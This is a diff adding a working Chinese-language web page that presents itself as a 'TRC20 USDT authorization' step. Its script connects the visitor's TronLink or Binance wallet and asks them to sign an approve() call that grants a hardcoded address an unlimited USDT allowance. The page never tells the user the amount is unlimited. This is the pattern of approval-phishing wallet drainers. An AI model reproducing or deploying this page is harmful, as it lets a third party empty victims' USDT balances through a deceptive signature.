@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TRC20 USDT 授權頁面</title>
+<style>
+  body {
+    font-family: "Noto Sans TC", sans-serif;
+    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
+    background-size: 400% 400%;
+    animation: gradientBG 12s ease infinite;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+  .container {
+    background: rgba(255,255,255,0.05);
+    padding: 30px;
+    border-radius: 15px;
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
+    backdrop-filter: blur(10px);
+  }
+  h1 {
+    font-size: 22px;
+    margin-bottom: 15px;
+  }
+  p {
+    font-size: 15px;
+    margin-bottom: 20px;
+    color: #cbd5e1;
+  }
+  button {
+    padding: 12px;
+    width: 100%;
+    background: linear-gradient(90deg, #2563eb, #3b82f6);
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    color: white;
+    cursor: pointer;
+  }
+  button:hover {
+    background: linear-gradient(90deg, #1d4ed8, #2563eb);
+  }
+  #status {
+    margin-top: 15px;
+    font-size: 14px;
+  }
+  .success { color: #4ade80; }
+  .error { color: #f87171; }
+  .loading { color: #facc15; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+</head>
+<body>
+<div class="container">
+  <h1>TRC20 USDT 授權</h1>
+  <p>合約地址：<br><small>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</small></p>
+  <p>授權給地址：<br><small>TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf</small></p>
+  <button id="approveBtn">授權 USDT</button>
+  <p id="status"></p>
+</div>
+
+<script>
+  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  const A_ADDRESS = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  let tronWeb;
+
+  async function connectWallet() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    if (window.binance && window.binance.tron) {
+      await window.binance.tron.request({ method: 'tron_requestAccounts' });
+      tronWeb = new TronWeb(window.binance.tron);
+      return tronWeb.defaultAddress.base58;
+    }
+    // 未檢測到錢包 → 直接跳轉 TronLink 官方下載
+    window.location.href = "https://www.tronlink.org/";
+    return null;
+  }
+
+  async function approve() {
+    if (!tronWeb) {
+      document.getElementById("status").innerText = "正在連接錢包...";
+      document.getElementById("status").className = "loading";
+      const address = await connectWallet();
+      if (!address) return;
+      document.getElementById("status").innerText = "已連接錢包：" + address;
+      document.getElementById("status").className = "success";
+    }
+    try {
+      const contract = await tronWeb.contract().at(USDT_CONTRACT);
+      document.getElementById("status").innerText = "發送授權交易中...";
+      document.getElementById("status").className = "loading";
+      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      document.getElementById("status").innerText = "✅ 授權成功！交易 ID：" + tx;
+      document.getElementById("status").className = "success";
+    } catch (err) {
+      console.error(err);
+      document.getElementById("status").innerText = "❌ 授權失敗或取消";
+      document.getElementById("status").className = "error";
+    }
+  }
+
+  document.getElementById("approveBtn").onclick = approve;
+</script>
+</body>
+</html>
